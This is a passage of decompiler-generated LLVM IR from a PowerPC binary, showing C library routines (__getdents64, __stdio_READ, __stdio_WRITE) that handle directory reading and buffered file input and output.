  %v0_1000faf8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000faf0, i32 %v0_1000faf8)
  %v0_1000fb08 = load i32, i32* @r2, align 4
  %v1_1000fb0c = add i32 %v0_1000fb08, -28672
  %v2_1000fb10 = inttoptr i32 %v1_1000fb0c to i32*
  store i32 %v0_1000faec, i32* %v2_1000fb10, align 4
  ret i32 -1

; uselistorder directives
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 36, 37, 38, 39, 40, 41, 15, 46, 45, 47, 1, 0, 33, 34, 35, 30, 31, 32, 50, 51, 52, 42, 43, 44, 2, 3, 4, 49, 48, 16, 17, 14, 18, 13, 19, 9, 20, 5, 21, 12, 6, 53, 7, 22, 10, 8, 11, 28, 23, 27, 24, 25, 26, 29 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000fb1c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000fb1c, i32* %stack_var_-48, align 4
  %v5_1000fb1c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v4_1000fb1c, i32* %r9.global-to-local, align 4
  %v1_1000fb28 = add i32 %arg3, 30
  %v1_1000fb2c = call i32 @__asm_rlwinm(i32 %v1_1000fb28, i32 0, i32 0, i32 27)
  store i32 %v5_1000fb1c, i32* @r31, align 4
  %v1_1000fb3c = load i32, i32* @r1, align 4
  %v3_1000fb3c = sub i32 %v1_1000fb3c, %v1_1000fb2c
  %v4_1000fb3c = inttoptr i32 %v3_1000fb3c to i32*
  store i32 %v4_1000fb1c, i32* %v4_1000fb3c, align 4
  store i32 %tmp, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r29.global-to-local, align 4
  store i32 %arg1, i32* %r23.global-to-local, align 4
  %v1_1000fb4c = add i32 %v3_1000fb3c, 23
  %v1_1000fb50 = call i32 @__asm_rlwinm(i32 %v1_1000fb4c, i32 0, i32 0, i32 27)
  store i32 %v1_1000fb50, i32* %r30.global-to-local, align 4
  %v0_1000fb60 = call i32 @__asm_mfcr()
  %v1_1000fb64 = and i32 %v0_1000fb60, 268435456
  store i32 %v1_1000fb64, i32* %r9.global-to-local, align 4
  %v3_1000fb64 = icmp eq i32 %v1_1000fb64, 0
  br i1 %v3_1000fb64, label %dec_label_pc_1000fb88, label %dec_label_pc_1000fb6c

dec_label_pc_1000fb6c:                            ; preds = %entry
  store i32 -1, i32* %r11.global-to-local, align 4
  %v0_1000fb78 = load i32, i32* @r2, align 4
  %v1_1000fb7c = add i32 %v0_1000fb78, -28672
  store i32 %v1_1000fb7c, i32* %r9.global-to-local, align 4
  %v2_1000fb80 = inttoptr i32 %v1_1000fb7c to i32*
  store i32 %v0_1000fb60, i32* %v2_1000fb80, align 4
  br label %dec_label_pc_1000fc54

dec_label_pc_1000fb88:                            ; preds = %entry
  %v3_1000fb88 = icmp eq i32 %v0_1000fb60, -1
  store i32 -1, i32* %r11.global-to-local, align 4
  br i1 %v3_1000fb88, label %dec_label_pc_1000fc54, label %dec_label_pc_1000fb94

dec_label_pc_1000fb94:                            ; preds = %dec_label_pc_1000fb88
  %v0_1000fb94 = load i32, i32* %r26.global-to-local, align 4
  %v1_1000fb94 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000fb94 = add i32 %v1_1000fb94, %v0_1000fb94
  store i32 %v2_1000fb94, i32* %r25.global-to-local, align 4
  %v0_1000fb98 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000fb98 = add i32 %v0_1000fb98, %v0_1000fb60
  store i32 %v2_1000fb98, i32* %r24.global-to-local, align 4
  store i32 %v0_1000fb94, i32* %r29.global-to-local, align 4
  store i32 -1, i32* %r27.global-to-local, align 4
  store i32 -1, i32* %r28.global-to-local, align 4
  %v2_1000fc403 = icmp ult i32 %v0_1000fb98, %v2_1000fb98
  %v1_1000fc447 = add i32 %v0_1000fb94, 19
  store i32 %v1_1000fc447, i32* @r3, align 4
  %v1_1000fc489 = add i32 %v0_1000fb98, 19
  store i32 %v1_1000fc489, i32* @r4, align 4
  br i1 %v2_1000fc403, label %dec_label_pc_1000fbac, label %dec_label_pc_1000fc50

dec_label_pc_1000fbac:                            ; preds = %dec_label_pc_1000fb94, %dec_label_pc_1000fc04
  %v0_1000fbac = phi i32 [ %v2_1000fc3c, %dec_label_pc_1000fc04 ], [ %v0_1000fb98, %dec_label_pc_1000fb94 ]
  %v1_1000fbac = add i32 %v0_1000fbac, 16
  %v2_1000fbac = inttoptr i32 %v1_1000fbac to i16*
  %v3_1000fbac = load i16, i16* %v2_1000fbac, align 2
  %v4_1000fbac = zext i16 %v3_1000fbac to i32
  %v1_1000fbb0 = add nuw nsw i32 %v4_1000fbac, 7
  %v1_1000fbb4 = add nsw i32 %v4_1000fbac, -19
  store i32 %v1_1000fbb4, i32* @r5, align 4
  %v1_1000fbb8 = call i32 @__asm_rlwinm(i32 %v1_1000fbb0, i32 0, i32 0, i32 28)
  %v0_1000fbbc = load i32, i32* %r29.global-to-local, align 4
  %v3_1000fbbc = add i32 %v1_1000fbb8, %v0_1000fbbc
  store i32 %v3_1000fbbc, i32* %r11.global-to-local, align 4
  %v1_1000fbc0 = load i32, i32* %r25.global-to-local, align 4
  %v3_1000fbc0 = icmp ugt i32 %v3_1000fbbc, %v1_1000fbc0
  br i1 %v3_1000fbc0, label %dec_label_pc_1000fbc8, label %dec_label_pc_1000fc04

dec_label_pc_1000fbc8:                            ; preds = %dec_label_pc_1000fbac
  %v0_1000fbc8 = load i32, i32* %r23.global-to-local, align 4
  %v0_1000fbcc = load i32, i32* %r27.global-to-local, align 4
  %v0_1000fbd0 = load i32, i32* %r28.global-to-local, align 4
  %v4_1000fbd8 = call i32 @__GI_lseek64(i32 %v0_1000fbc8, i32 %v0_1000fbcc, i32 %v0_1000fbd0, i32 0)
  %v0_1000fbdc = load i32, i32* %r29.global-to-local, align 4
  %v1_1000fbdc = load i32, i32* %r26.global-to-local, align 4
  %v4_1000fbdc = icmp eq i32 %v0_1000fbdc, %v1_1000fbdc
  br i1 %v4_1000fbdc, label %dec_label_pc_1000fbe4, label %dec_label_pc_1000fc50

dec_label_pc_1000fbe4:                            ; preds = %dec_label_pc_1000fbc8
  store i32 -1, i32* %r11.global-to-local, align 4
  %v0_1000fbf4 = load i32, i32* @r2, align 4
  %v1_1000fbf8 = add i32 %v0_1000fbf4, -28672
  store i32 %v1_1000fbf8, i32* %r9.global-to-local, align 4
  %v2_1000fbfc = inttoptr i32 %v1_1000fbf8 to i32*
  store i32 22, i32* %v2_1000fbfc, align 4
  br label %dec_label_pc_1000fc54

dec_label_pc_1000fc04:                            ; preds = %dec_label_pc_1000fbac
  %v2_1000fbb8 = trunc i32 %v1_1000fbb8 to i16
  %v0_1000fc04 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000fc04 = add i32 %v0_1000fc04, 8
  %v2_1000fc04 = inttoptr i32 %v1_1000fc04 to i32*
  %v3_1000fc04 = load i32, i32* %v2_1000fc04, align 4
  store i32 %v3_1000fc04, i32* %r27.global-to-local, align 4
  %v1_1000fc08 = add i32 %v0_1000fc04, 12
  %v2_1000fc08 = inttoptr i32 %v1_1000fc08 to i32*
  %v3_1000fc08 = load i32, i32* %v2_1000fc08, align 4
  store i32 %v3_1000fc08, i32* %r28.global-to-local, align 4
  %v1_1000fc0c = inttoptr i32 %v0_1000fc04 to i32*
  %v2_1000fc0c = load i32, i32* %v1_1000fc0c, align 4
  store i32 %v2_1000fc0c, i32* %r9.global-to-local, align 4
  %v1_1000fc10 = add i32 %v0_1000fc04, 4
  %v2_1000fc10 = inttoptr i32 %v1_1000fc10 to i32*
  %v3_1000fc10 = load i32, i32* %v2_1000fc10, align 4
  store i32 %v3_1000fc10, i32* %r10.global-to-local, align 4
  %v4_1000fc14 = add i32 %v0_1000fbbc, 16
  %v5_1000fc14 = inttoptr i32 %v4_1000fc14 to i16*
  store i16 %v2_1000fbb8, i16* %v5_1000fc14, align 2
  %v0_1000fc18 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000fc18 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000fc18 = inttoptr i32 %v1_1000fc18 to i32*
  store i32 %v0_1000fc18, i32* %v2_1000fc18, align 4
  %v0_1000fc1c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000fc1c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000fc1c = add i32 %v1_1000fc1c, 4
  %v3_1000fc1c = inttoptr i32 %v2_1000fc1c to i32*
  store i32 %v0_1000fc1c, i32* %v3_1000fc1c, align 4
  %v0_1000fc20 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000fc20 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000fc20 = add i32 %v1_1000fc20, 8
  %v3_1000fc20 = inttoptr i32 %v2_1000fc20 to i32*
  store i32 %v0_1000fc20, i32* %v3_1000fc20, align 4
  %v0_1000fc24 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000fc24 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000fc24 = add i32 %v1_1000fc24, 12
  %v3_1000fc24 = inttoptr i32 %v2_1000fc24 to i32*
  store i32 %v0_1000fc24, i32* %v3_1000fc24, align 4
  %v0_1000fc28 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000fc28 = add i32 %v0_1000fc28, 18
  %v2_1000fc28 = inttoptr i32 %v1_1000fc28 to i8*
  %v3_1000fc28 = load i8, i8* %v2_1000fc28, align 1
  %v2_1000fc2c = load i32, i32* %r29.global-to-local, align 4
  %v3_1000fc2c = add i32 %v2_1000fc2c, 18
  %v4_1000fc2c = inttoptr i32 %v3_1000fc2c to i8*
  store i8 %v3_1000fc28, i8* %v4_1000fc2c, align 1
  %v0_1000fc30 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000fc30, i32* %r29.global-to-local, align 4
  store i32 268500024, i32* @lr, align 4
  %v0_1000fc34 = call i32 @memcpy()
  %v0_1000fc38 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000fc38 = add i32 %v0_1000fc38, 16
  %v2_1000fc38 = inttoptr i32 %v1_1000fc38 to i16*
  %v3_1000fc38 = load i16, i16* %v2_1000fc38, align 2
  %v4_1000fc38 = zext i16 %v3_1000fc38 to i32
  %v2_1000fc3c = add i32 %v4_1000fc38, %v0_1000fc38
  store i32 %v2_1000fc3c, i32* %r30.global-to-local, align 4
  %v1_1000fc40 = load i32, i32* %r24.global-to-local, align 4
  %v2_1000fc40 = icmp ult i32 %v2_1000fc3c, %v1_1000fc40
  %v0_1000fc44 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000fc44 = add i32 %v0_1000fc44, 19
  store i32 %v1_1000fc44, i32* @r3, align 4
  %v1_1000fc48 = add i32 %v2_1000fc3c, 19
  store i32 %v1_1000fc48, i32* @r4, align 4
  br i1 %v2_1000fc40, label %dec_label_pc_1000fbac, label %dec_label_pc_1000fc40.dec_label_pc_1000fc50.loopexit_crit_edge

dec_label_pc_1000fc40.dec_label_pc_1000fc50.loopexit_crit_edge: ; preds = %dec_label_pc_1000fc04
  %v0_1000fc50.pre.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_1000fc50

dec_label_pc_1000fc50:                            ; preds = %dec_label_pc_1000fb94, %dec_label_pc_1000fc40.dec_label_pc_1000fc50.loopexit_crit_edge, %dec_label_pc_1000fbc8
  %v1_1000fc50 = phi i32 [ %v0_1000fbdc, %dec_label_pc_1000fbc8 ], [ %v0_1000fc44, %dec_label_pc_1000fc40.dec_label_pc_1000fc50.loopexit_crit_edge ], [ %v0_1000fb94, %dec_label_pc_1000fb94 ]
  %v0_1000fc50 = phi i32 [ %v1_1000fbdc, %dec_label_pc_1000fbc8 ], [ %v0_1000fc50.pre.pre, %dec_label_pc_1000fc40.dec_label_pc_1000fc50.loopexit_crit_edge ], [ %v0_1000fb94, %dec_label_pc_1000fb94 ]
  %v2_1000fc50 = sub i32 %v1_1000fc50, %v0_1000fc50
  store i32 %v2_1000fc50, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000fc54

dec_label_pc_1000fc54:                            ; preds = %dec_label_pc_1000fb88, %dec_label_pc_1000fbe4, %dec_label_pc_1000fb6c, %dec_label_pc_1000fc50
  %v0_1000fc54 = load i32, i32* %r11.global-to-local, align 4
  %v0_1000fc58 = load i32, i32* @r1, align 4
  %v1_1000fc58 = inttoptr i32 %v0_1000fc58 to i32*
  %v2_1000fc58 = load i32, i32* %v1_1000fc58, align 4
  store i32 %v2_1000fc58, i32* %r11.global-to-local, align 4
  ret i32 %v0_1000fc54

; uselistorder directives
  uselistorder i32 %v2_1000fc3c, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1000fc04, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000fbb8, { 1, 0 }
  uselistorder i32 %v0_1000fb98, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000fb94, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_1000fb60, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11 }
  uselistorder i32* %r11.global-to-local, { 0, 6, 1, 3, 2, 4, 5, 7 }
  uselistorder i32 ()* @memcpy, { 6, 5, 4, 1, 0, 2, 3, 7 }
  uselistorder i32 18, { 7, 8, 14, 15, 16, 4, 5, 1, 0, 6, 9, 10, 11, 12, 13, 2, 3 }
  uselistorder i32 22, { 2, 3, 11, 4, 5, 1, 6, 10, 7, 0, 8, 9 }
  uselistorder i32 7, { 34, 56, 18, 0, 1, 57, 19, 20, 5, 21, 22, 6, 23, 24, 7, 25, 26, 27, 35, 36, 37, 38, 39, 28, 29, 30, 2, 31, 40, 8, 41, 9, 42, 43, 44, 10, 11, 45, 12, 46, 13, 47, 14, 48, 49, 15, 50, 51, 16, 3, 32, 52, 4, 33, 53, 54, 17, 55 }
  uselistorder i32 19, { 16, 17, 0, 1, 25, 26, 27, 2, 18, 8, 9, 3, 10, 11, 4, 12, 13, 5, 14, 15, 6, 19, 20, 21, 22, 23, 24, 7 }
  uselistorder i32 23, { 17, 21, 22, 6, 7, 0, 8, 9, 1, 10, 11, 12, 13, 14, 2, 15, 16, 3, 18, 5, 19, 20, 4 }
  uselistorder i32* @r1, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 27, { 1, 2, 6, 5, 3, 0, 4, 7 }
  uselistorder i32 30, { 5, 9, 0, 13, 14, 12, 15, 16, 17, 18, 19, 20, 1, 2, 3, 4, 6, 7, 8, 10, 11 }
  uselistorder label %dec_label_pc_1000fc54, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000fc50, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000fbac, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_1000fc84 = load i16, i16* %arg1, align 2
  %v4_1000fc84 = zext i16 %v3_1000fc84 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000fc8c = and i32 %v4_1000fc84, 4
  store i32 %v1_1000fc8c, i32* @r9, align 4
  %v3_1000fc8c = icmp eq i32 %v1_1000fc8c, 0
  store i1 %v3_1000fc8c, i1* @cr0_eq, align 1
  br i1 %v3_1000fc8c, label %dec_label_pc_1000fc94, label %dec_label_pc_1000fcd4

dec_label_pc_1000fc94:                            ; preds = %entry
  %tmp5 = icmp sgt i32 %arg2, -1
  br i1 %tmp5, label %dec_label_pc_1000fca4, label %dec_label_pc_1000fc9c

dec_label_pc_1000fc9c:                            ; preds = %dec_label_pc_1000fc94
  br label %dec_label_pc_1000fca4

dec_label_pc_1000fca4:                            ; preds = %dec_label_pc_1000fc94, %dec_label_pc_1000fc9c
  %v1_1000fca4 = add i32 %tmp, 4
  %v2_1000fca4 = inttoptr i32 %v1_1000fca4 to i32*
  %v3_1000fca4 = load i32, i32* %v2_1000fca4, align 4
  store i32 %v3_1000fca4, i32* @r3, align 4
  %v1_1000fca8 = call i32 @__libc_read(i32 %v3_1000fca4)
  store i32 %v1_1000fca8, i32* %r3.global-to-local, align 4
  %v2_1000fcac = icmp sgt i32 %v1_1000fca8, 0
  %v3_1000fcac = icmp eq i32 %v1_1000fca8, 0
  store i1 %v3_1000fcac, i1* @cr0_eq, align 1
  br i1 %v2_1000fcac, label %dec_label_pc_1000fcd4, label %dec_label_pc_1000fcb4

dec_label_pc_1000fcb4:                            ; preds = %dec_label_pc_1000fca4
  %v0_1000fcb4 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000fcb4 = inttoptr i32 %v0_1000fcb4 to i16*
  %v2_1000fcb4 = load i16, i16* %v1_1000fcb4, align 2
  br i1 %v3_1000fcac, label %dec_label_pc_1000fcbc, label %dec_label_pc_1000fcc8

dec_label_pc_1000fcbc:                            ; preds = %dec_label_pc_1000fcb4
  %v1_1000fcbc = or i16 %v2_1000fcb4, 4
  store i16 %v1_1000fcbc, i16* %v1_1000fcb4, align 2
  br label %dec_label_pc_1000fcd4

dec_label_pc_1000fcc8:                            ; preds = %dec_label_pc_1000fcb4
  %v1_1000fcc8 = or i16 %v2_1000fcb4, 8
  store i32 0, i32* %r3.global-to-local, align 4
  store i16 %v1_1000fcc8, i16* %v1_1000fcb4, align 2
  br label %dec_label_pc_1000fcd4

dec_label_pc_1000fcd4:                            ; preds = %entry, %dec_label_pc_1000fca4, %dec_label_pc_1000fcbc, %dec_label_pc_1000fcc8
  %v0_1000fce4 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000fce4

; uselistorder directives
  uselistorder i16 %v2_1000fcb4, { 1, 0 }
  uselistorder i16* %v1_1000fcb4, { 1, 0, 2 }
  uselistorder i32 %v1_1000fca8, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 4, 0 }
  uselistorder i32 (i32)* @__libc_read, { 2, 4, 0, 5, 1, 3 }
  uselistorder label %dec_label_pc_1000fcd4, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000fca4, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1000fcec = load i32, i32* @lr, align 4
  store i32 %v0_1000fcec, i32* %r0.global-to-local, align 4
  %v0_1000fcf8 = load i32, i32* @r5, align 4
  store i32 %v0_1000fcf8, i32* @r27, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 2147483647, i32* @r28, align 4
  store i32 %v0_1000fcf8, i32* @r31, align 4
  %v3_1000fdcc3 = icmp eq i32 %v0_1000fcf8, 0
  store i1 %v3_1000fdcc3, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000fdcc3, label %dec_label_pc_1000fdd8, label %dec_label_pc_1000fd14

dec_label_pc_1000fd14:                            ; preds = %entry, %dec_label_pc_1000fd30
  %v0_1000fd20 = phi i32 [ %v2_1000fd30, %dec_label_pc_1000fd30 ], [ %arg2, %entry ]
  %v1_1000fd14.in = phi i32 [ %v2_1000fd34, %dec_label_pc_1000fd30 ], [ %v0_1000fcf8, %entry ]
  %v1_1000fd14 = icmp sgt i32 %v1_1000fd14.in, 0
  br i1 %v1_1000fd14, label %dec_label_pc_1000fd1c, label %dec_label_pc_1000fd18

dec_label_pc_1000fd18:                            ; preds = %dec_label_pc_1000fd14
  br label %dec_label_pc_1000fd1c

dec_label_pc_1000fd1c:                            ; preds = %dec_label_pc_1000fd14, %dec_label_pc_1000fd18
  %v0_1000fd1c = load i32, i32* @r30, align 4
  %v1_1000fd1c = add i32 %v0_1000fd1c, 4
  %v2_1000fd1c = inttoptr i32 %v1_1000fd1c to i32*
  %v3_1000fd1c = load i32, i32* %v2_1000fd1c, align 4
  store i32 %v3_1000fd1c, i32* @r3, align 4
  store i32 %v0_1000fd20, i32* @r4, align 4
  %v3_1000fd24 = call i32 @__GI___libc_write(i32 %v3_1000fd1c, i32 %v0_1000fd20)
  %v1_1000fd28 = icmp slt i32 %v3_1000fd24, 0
  %v3_1000fd28 = icmp eq i32 %v3_1000fd24, 0
  store i1 %v3_1000fd28, i1* @cr0_eq, align 1
  br i1 %v1_1000fd28, label %dec_label_pc_1000fd3c, label %dec_label_pc_1000fd30

dec_label_pc_1000fd30:                            ; preds = %dec_label_pc_1000fd1c
  %v0_1000fd30 = load i32, i32* @r29, align 4
  %v2_1000fd30 = add i32 %v0_1000fd30, %v3_1000fd24
  store i32 %v2_1000fd30, i32* @r29, align 4
  %v1_1000fd34 = load i32, i32* @r31, align 4
  %v2_1000fd34 = sub i32 %v1_1000fd34, %v3_1000fd24
  store i32 %v2_1000fd34, i32* @r31, align 4
  %v3_1000fdcc = icmp eq i32 %v2_1000fd34, 0
  store i1 %v3_1000fdcc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000fdcc, label %dec_label_pc_1000fdd8, label %dec_label_pc_1000fd14

dec_label_pc_1000fd3c:                            ; preds = %dec_label_pc_1000fd1c
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v0_1000fd40 = load i32, i32* @r30, align 4
  %v1_1000fd40 = inttoptr i32 %v0_1000fd40 to i16*
  %v2_1000fd40 = load i16, i16* %v1_1000fd40, align 2
  %v3_1000fd40 = zext i16 %v2_1000fd40 to i32
  %v0_1000fd48 = load i32, i32* @r2, align 4
  %v1_1000fd4c = or i32 %v3_1000fd40, 8
  store i32 %v1_1000fd4c, i32* %r0.global-to-local, align 4
  %v1_1000fd50 = add i32 %v0_1000fd48, -28672
  store i32 %v1_1000fd50, i32* %r9.global-to-local, align 4
  %v1_1000fd54 = trunc i32 %v1_1000fd4c to i16
  store i16 %v1_1000fd54, i16* %v1_1000fd40, align 2
  %v0_1000fd58 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000fd58 = inttoptr i32 %v0_1000fd58 to i32*
  %v2_1000fd58 = load i32, i32* %v1_1000fd58, align 4
  store i32 %v2_1000fd58, i32* @r9, align 4
  %v3_1000fd5c = icmp eq i32 %v2_1000fd58, 4
  store i1 %v3_1000fd5c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000fd5c, label %dec_label_pc_1000fd6c, label %dec_label_pc_1000fd64

dec_label_pc_1000fd64:                            ; preds = %dec_label_pc_1000fd3c
  %v3_1000fd64 = icmp eq i32 %v2_1000fd58, 11
  store i1 %v3_1000fd64, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000fd64, label %dec_label_pc_1000fd6c, label %dec_label_pc_1000fdd8

dec_label_pc_1000fd6c:                            ; preds = %dec_label_pc_1000fd64, %dec_label_pc_1000fd3c
  %v0_1000fd6c = load i32, i32* @r30, align 4
  %v1_1000fd6c = add i32 %v0_1000fd6c, 8
  %v2_1000fd6c = inttoptr i32 %v1_1000fd6c to i32*
  %v3_1000fd6c = load i32, i32* %v2_1000fd6c, align 4
  store i32 %v3_1000fd6c, i32* @r9, align 4
  %v1_1000fd70 = add i32 %v0_1000fd6c, 12
  %v2_1000fd70 = inttoptr i32 %v1_1000fd70 to i32*
  %v3_1000fd70 = load i32, i32* %v2_1000fd70, align 4
  %v2_1000fd74 = sub i32 %v3_1000fd70, %v3_1000fd6c
  store i32 %v2_1000fd74, i32* %r0.global-to-local, align 4
  %v5_1000fd74 = icmp eq i32 %v2_1000fd74, 0
  store i1 %v5_1000fd74, i1* @cr0_eq, align 1
  %v0_1000fdc4.pre = load i32, i32* @r31, align 4
  br i1 %v5_1000fd74, label %dec_label_pc_1000fdc4, label %dec_label_pc_1000fd7c

dec_label_pc_1000fd7c:                            ; preds = %dec_label_pc_1000fd6c
  %v3_1000fd7c = icmp ugt i32 %v2_1000fd74, %v0_1000fdc4.pre
  %v4_1000fd7c = icmp eq i32 %v2_1000fd74, %v0_1000fdc4.pre
  store i1 %v4_1000fd7c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000fd7c, label %dec_label_pc_1000fd84, label %dec_label_pc_1000fd88

dec_label_pc_1000fd84:                            ; preds = %dec_label_pc_1000fd7c
  store i32 %v0_1000fdc4.pre, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000fd88

dec_label_pc_1000fd88:                            ; preds = %dec_label_pc_1000fd7c, %dec_label_pc_1000fd84
  %v0_1000fd88 = phi i32 [ %v2_1000fd74, %dec_label_pc_1000fd7c ], [ %v0_1000fdc4.pre, %dec_label_pc_1000fd84 ]
  store i32 %v0_1000fd88, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000fd8c

dec_label_pc_1000fd8c:                            ; preds = %dec_label_pc_1000fdac, %dec_label_pc_1000fd88
  %v2_1000fd98 = phi i32 [ %v1_1000fdac, %dec_label_pc_1000fdac ], [ %v3_1000fd6c, %dec_label_pc_1000fd88 ]
  %v0_1000fd8c = load i32, i32* @r29, align 4
  %v1_1000fd8c = inttoptr i32 %v0_1000fd8c to i8*
  %v2_1000fd8c = load i8, i8* %v1_1000fd8c, align 1
  %v3_1000fd8c = zext i8 %v2_1000fd8c to i32
  store i32 %v3_1000fd8c, i32* %r0.global-to-local, align 4
  %v1_1000fd90 = add i32 %v0_1000fd8c, 1
  store i32 %v1_1000fd90, i32* @r29, align 4
  %v3_1000fd94 = icmp eq i8 %v2_1000fd8c, 10
  store i1 %v3_1000fd94, i1* %cr7_eq.global-to-local, align 1
  %v3_1000fd98 = inttoptr i32 %v2_1000fd98 to i8*
  store i8 %v2_1000fd8c, i8* %v3_1000fd98, align 1
  %v0_1000fd9c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000fd9c, label %dec_label_pc_1000fda0, label %dec_label_pc_1000fdac

dec_label_pc_1000fda0:                            ; preds = %dec_label_pc_1000fd8c
  %v0_1000fda0 = load i32, i32* @r30, align 4
  %v1_1000fda0 = inttoptr i32 %v0_1000fda0 to i16*
  %v2_1000fda0 = load i16, i16* %v1_1000fda0, align 2
  %v3_1000fda0 = zext i16 %v2_1000fda0 to i32
  store i32 %v3_1000fda0, i32* %r0.global-to-local, align 4
  %v1_1000fda4 = and i32 %v3_1000fda0, 256
  store i32 %v1_1000fda4, i32* @r11, align 4
  %v3_1000fda4 = icmp eq i32 %v1_1000fda4, 0
  store i1 %v3_1000fda4, i1* @cr0_eq, align 1
  br i1 %v3_1000fda4, label %dec_label_pc_1000fdac, label %dec_label_pc_1000fda0.dec_label_pc_1000fdb4_crit_edge

dec_label_pc_1000fda0.dec_label_pc_1000fdb4_crit_edge: ; preds = %dec_label_pc_1000fda0
  %v0_1000fdb8.pre = load i32, i32* @r9, align 4
  br label %dec_label_pc_1000fdb4

dec_label_pc_1000fdac:                            ; preds = %dec_label_pc_1000fda0, %dec_label_pc_1000fd8c
  %v0_1000fdac = load i32, i32* @r9, align 4
  %v1_1000fdac = add i32 %v0_1000fdac, 1
  store i32 %v1_1000fdac, i32* @r9, align 4
  %v0_1000fdb0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000fdb0 = add i32 %v0_1000fdb0, -1
  store i32 %v1_1000fdb0, i32* %ctr.global-to-local, align 4
  %v2_1000fdb0 = icmp eq i32 %v1_1000fdb0, 0
  br i1 %v2_1000fdb0, label %dec_label_pc_1000fdac.dec_label_pc_1000fdb4_crit_edge, label %dec_label_pc_1000fd8c

dec_label_pc_1000fdac.dec_label_pc_1000fdb4_crit_edge: ; preds = %dec_label_pc_1000fdac
  %v0_1000fdb4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000fdb4

dec_label_pc_1000fdb4:                            ; preds = %dec_label_pc_1000fda0.dec_label_pc_1000fdb4_crit_edge, %dec_label_pc_1000fdac.dec_label_pc_1000fdb4_crit_edge
  %v0_1000fdb8 = phi i32 [ %v1_1000fdac, %dec_label_pc_1000fdac.dec_label_pc_1000fdb4_crit_edge ], [ %v0_1000fdb8.pre, %dec_label_pc_1000fda0.dec_label_pc_1000fdb4_crit_edge ]
  %v0_1000fdb4 = phi i32 [ %v0_1000fdb4.pre, %dec_label_pc_1000fdac.dec_label_pc_1000fdb4_crit_edge ], [ %v0_1000fda0, %dec_label_pc_1000fda0.dec_label_pc_1000fdb4_crit_edge ]
  %v1_1000fdb4 = add i32 %v0_1000fdb4, 8
  %v2_1000fdb4 = inttoptr i32 %v1_1000fdb4 to i32*
  %v3_1000fdb4 = load i32, i32* %v2_1000fdb4, align 4
  store i32 %v3_1000fdb4, i32* %r0.global-to-local, align 4
  %v2_1000fdb8 = add i32 %v0_1000fdb4, 16
